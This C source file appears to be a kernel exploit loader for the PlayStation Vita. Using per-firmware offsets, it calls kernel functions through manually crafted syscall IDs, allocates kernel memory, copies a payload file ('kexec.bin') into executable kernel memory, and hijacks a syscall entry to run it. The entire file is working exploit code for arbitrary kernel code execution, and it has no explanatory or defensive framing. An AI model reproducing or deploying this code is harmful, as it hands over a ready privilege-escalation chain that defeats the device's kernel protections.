#define PAYLOAD_PATH "host0:kexec.bin"

//#define FW_0945
//#define FW_0995
#define FW_103
//#define FW_150

#include <fios2.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <stdlib.h>
#include <sceerror.h>
#include <libdbg.h>
#include <kernel.h>
#include <libsysmodule.h>
#include <ngs.h>
#include <apputil.h>
#include <ngs/error.h>
#include <appmgr.h>
#include <kernel/threadmgr.h>
#include <kernel/modulemgr.h>
#include <kernel/iofilemgr.h>

#include "offsets.h"

SceInt32 g_syscall_id;
SceInt32 psvSyscallManual(void*,void*,void*,void*);

void set_syscall(int kaddr)
{
	SceInt64 val;
	val = kaddr - SYSCALLTABLE;
	val &= 0xFFFFFFFF;
	val /= 4;
	val +=0x100;
	g_syscall_id=val;
}

SceInt32 sceKernelAllocMemBlockForKernel(char* name, int type, SceInt32 size, struct SceKernelAllocMemKernelBlockOpt* opt)
{
	set_syscall(sceKernelAllocMemBlockForDriver_offset);
	return psvSyscallManual(name, (void*)type, (void*)size, opt);
}
SceInt32 sceKernelMemcpyUserToKernel(void* dest, void* source, SceInt32 size)
{
	set_syscall(sceKernelMemcpyUserToKernel_offset);
	return psvSyscallManual(dest, source, (void*)size, 0);
}
SceInt32 sceKernelMemcpyKernelToUser(void* dest, void* source, SceInt32 size)
{
	set_syscall(sceKernelMemcpyKernelToUser_offset);
	return psvSyscallManual(dest, source, (void*)size, 0);
}
SceInt32 sceKernelGetMemBlockBaseForKernel(SceInt32 block, void* baseaddr)
{
	set_syscall(sceKernelGetMemBlockBaseForDriver_offset);
	return psvSyscallManual((void*)block, baseaddr, 0, 0);
}
SceInt32 sceKernelCpuUnrestrictedMemcpy(void* dest, void* source, SceInt32 size)
{
	set_syscall(sceKernelCpuUnrestrictedMemcpy_offset);
	return psvSyscallManual(dest, source, (void*)size, 0);
} 

void execute_payload(char* payload_path)
{
	SceInt32 res = 0, baseaddr = 0, rwbaseuser = 0, rxbaseuser = 0;
	unsigned char buffer[0x6000];
	memset(buffer, 0x00, 0x6000);

	SceUID fd = sceIoOpen(payload_path, SCE_O_RDONLY, 1);
	if(fd > 0)	{
		sceIoRead(fd, buffer, 0x6000);
		sceIoClose(fd);
	} else { 
		printf("ERROR: Couldn't open \'%s\'\n", payload_path);
		return;
	}
		
#if defined(FW_0945) || defined(FW_0995)
	struct SceKernelAllocMemKernelBlockOpt opt;
	memset(&opt, 0, sizeof(opt));
    opt.size = sizeof(opt);
	sceKernelMemcpyUserToKernel((void*)0x10000100, &opt, sizeof(opt));
	
	res = sceKernelAllocMemBlockForKernel("memblk", KERNEL_RW, 0x6000, (struct SceKernelAllocMemKernelBlockOpt*)0x10000100);
	if(res < 0)
		printf("sceKernelAllocMemBlockForKernel: %d\n", res);

	res = sceKernelGetMemBlockBaseForKernel(res, (void*)0x100000F0);
	if(res < 0)
		printf("sceKernelGetMemBlockBaseForKernel: %d (addr: 0x%08X)\n", res, baseaddr);

	sceKernelMemcpyKernelToUser(&baseaddr, (void*)0x100000F0, 4);
	printf("Base Address for RW mem: 0x%08X\n", baseaddr);
	rwbaseuser = baseaddr;
	
	sceKernelMemcpyUserToKernel((void*)rwbaseuser, (void*)buffer, 0x6000);

	res = sceKernelAllocMemBlockForKernel("rxmemblk", KERNEL_RX, 0x6000, (struct SceKernelAllocMemKernelBlockOpt*)0x10000100);
	if(res < 0)
		printf("sceKernelAllocMemBlockForKernel: %d\n", res);

	res = sceKernelGetMemBlockBaseForKernel(res,  (void*)0x100000F4);
	if(res < 0)
		printf("sceKernelGetMemBlockBaseForKernel: %d (addr: 0x%08X)\n", res, baseaddr);

	sceKernelMemcpyKernelToUser(&rxbaseuser, (void*)0x100000F4, 4);
	printf("Base Address for RX: 0x%08X\n", rxbaseuser);

	sceKernelCpuUnrestrictedMemcpy((void*)rxbaseuser, (void*)rwbaseuser, 0x6000);
	printf("copied code into rx\n");
	rxbaseuser |=1;

	sceKernelMemcpyUserToKernel((void*)0x10000108, (void*)&rxbaseuser, 4);
	set_syscall(0x10000108);

	printf("custom kernel code returned 0x%x\n", psvSyscallManual(0,0,0,0));
#elif defined(FW_150) || defined(FW_103)
	// Allocate an RW memblock with size 0x6000
	res = sceKernelAllocMemBlockForKernel(0, KERNEL_RW, (SceInt32)0x6000, (struct SceKernelAllocMemKernelBlockOpt*)NULL);
	if(res < 0)
		printf("sceKernelAllocMemBlockForKernel: %d\n", res);

	// Get newly-created memblock's base address
	res = sceKernelGetMemBlockBaseForKernel(res, (void*)0x584f00);
	if(res < 0)
		printf("sceKernelGetMemBlockBaseForKernel: %d (addr: 0x%08X)\n", res, baseaddr);

	sceKernelMemcpyKernelToUser(&baseaddr, (void*)0x584f00, 4);
	printf("Base Address for RW mem: 0x%08X\n", baseaddr);
	rwbaseuser = baseaddr;
	
	// Copy the payload into the RW memblock
	sceKernelMemcpyUserToKernel((void*)rwbaseuser, (void*)buffer, 0x6000);

	// Allocate an RX memblock
	res = sceKernelAllocMemBlockForKernel(0, KERNEL_RX, 0x6000, (struct SceKernelAllocMemKernelBlockOpt*)NULL);
	if(res < 0)
		printf("sceKernelAllocMemBlockForKernel: %d\n", res);

	res = sceKernelGetMemBlockBaseForKernel(res,  (void*)0x584f04);
	if(res < 0)
		printf("sceKernelGetMemBlockBaseForKernel: %d (addr: 0x%08X)\n", res, baseaddr);
		
	sceKernelMemcpyKernelToUser(&rxbaseuser, (void*)0x584f04, 4);
	printf("Base Address for RX: 0x%08X\n", rxbaseuser);

	// Copy the payload from RW->TX
	sceKernelCpuUnrestrictedMemcpy((void*)rxbaseuser, (void*)rwbaseuser, 0x6000);
	printf("copied code into rx\n");
	rxbaseuser |=1;

	// Copy pointer to our RX space with our payload and set syscall 
	sceKernelMemcpyUserToKernel((void*)0x105000, (void*)&rxbaseuser, 4);	
	set_syscall(0x105000);

	printf("custom kernel code returned 0x%x\n", psvSyscallManual(0,0,0,0));
#endif
}

int main(void)					
{
	execute_payload(PAYLOAD_PATH);

	return 0;
}